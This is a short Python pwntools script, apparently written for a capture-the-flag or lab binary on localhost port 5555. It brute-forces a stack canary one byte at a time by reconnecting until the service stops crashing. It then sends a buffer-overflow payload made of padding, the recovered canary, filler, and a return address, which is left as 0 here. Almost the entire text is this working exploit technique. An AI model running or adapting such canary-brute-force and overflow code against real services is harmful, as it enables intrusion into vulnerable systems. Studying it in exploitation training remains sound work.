from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')

# blasting canary
canary = "\x00"
padding = "a"*13*8 # bzero(&msg, 100uLL);
for x in xrange(7):
	for y in xrange(256):
		p = remote("127.0.0.1", 5555)
		print p.recv()
		p.send(padding + canary + chr(y))
		try:
			info = p.recv()
			print info
		except:
			p.close()
			continue
		p.close()
		break
	canary += chr(y)

# print canary.encode('hex')

tar_addr = 0 # return to
p = remote('127.0.0.1', 5555)
p.recv()
payload = padding + canary + 'a'*8 + p64(tar_addr)
p.send(payload)
